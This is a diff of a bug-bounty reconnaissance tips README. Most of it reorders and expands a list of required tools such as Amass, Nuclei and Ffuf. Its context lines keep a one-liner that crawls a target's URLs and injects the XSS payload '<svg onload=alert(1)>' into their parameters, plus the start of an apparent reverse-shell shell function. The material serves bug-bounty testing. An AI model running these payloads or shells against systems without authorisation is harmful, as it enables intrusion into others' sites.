@@ -18,25 +18,31 @@ Our main goal is to share tips from some well-known bughunters. Using recon meth
 - [@NahamSec](https://twitter.com/NahamSec)
 - [@j3ssiejjj](https://twitter.com/j3ssiejjj)
 
-
 ## Scripts that need to be installed
 
 To run the project, you will need to install the following programs:
 
-- [Anew](https://github.com/tomnomnom/anew)
-- [Qsreplace](https://github.com/tomnomnom/qsreplace)
-- [Subfinder](https://github.com/projectdiscovery/subfinder)
-- [Gospider](https://github.com/jaeles-project/gospider)
-- [Github-Search](https://github.com/gwen001/github-search)
 - [Amass](https://github.com/OWASP/Amass)
-- [Hakrawler](https://github.com/hakluke/hakrawler)
-- [Gargs](https://github.com/brentp/gargs)
+- [Anew](https://github.com/tomnomnom/anew)
+- [Apktool](https://github.com/iBotPeaches/Apktool)
 - [Chaos](https://github.com/projectdiscovery/chaos-client)
-- [Httpx](https://github.com/projectdiscovery/httpx)
+- [Ffuf](https://github.com/ffuf/ffuf)
 - [Findomain](https://github.com/Edu4rdSHL/findomain)
+- [Gargs](https://github.com/brentp/gargs)
 - [Gf](https://github.com/tomnomnom/gf)
-- [Unew](https://github.com/dwisiswant0/unew)
+- [Github-Search](https://github.com/gwen001/github-search)
+- [Gospider](https://github.com/jaeles-project/gospider)
+- [Hakrawler](https://github.com/hakluke/hakrawler)
+- [Httpx](https://github.com/projectdiscovery/httpx)
+- [Jaeles](https://github.com/jaeles-project/jaeles)
+- [Jq](https://github.com/stedolan/jq)
+- [Nuclei](https://github.com/projectdiscovery/nuclei)
+- [Qsreplace](https://github.com/tomnomnom/qsreplace)
 - [Rush](https://github.com/shenwei356/rush)
+- [Shodan](https://github.com/achillean/shodan-python)
+- [Subfinder](https://github.com/projectdiscovery/subfinder)
+- [Subjs](https://github.com/lc/subjs)
+- [Unew](https://github.com/dwisiswant0/unew)
 
 
 ###  Search Asn Amass
@@ -277,7 +283,7 @@ assetfinder att.com | sed 's#*.# #g' | httpx -silent -threads 10 | xargs -I@ sh 
 httpx -l master.txt -silent -no-color -threads 300 -location 301,302 | awk '{print $2}' | grep -Eo '(http|https)://[^/"].*' | tr -d '[]' | anew  | xargs -I@ sh -c 'gospider -d 0 -s @' | tr ' ' '\n' | grep -Eo '(http|https)://[^/"].*' | grep "=" | qsreplace "<svg onload=alert(1)>" "'
 ```
 
-###  Grap internal juicy paths and do requests to them.
+###  Grab internal juicy paths and do requests to them.
 
 - [Explained command](https://bit.ly/357b1IY)
 
@@ -374,8 +380,4 @@ function reverse { local port=443;adaptors=$(ip a | egrep ^[0-9]+ | cut -d" " -f
 
 
 
-
 <a href="https://www.buymeacoffee.com/OFJAAAH" target="_blank"><img src="https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png" alt="Buy Me A Coffee" style="height: 20px !important;width: 50px !important;box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;-webkit-box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;" ></a>
-
-
-
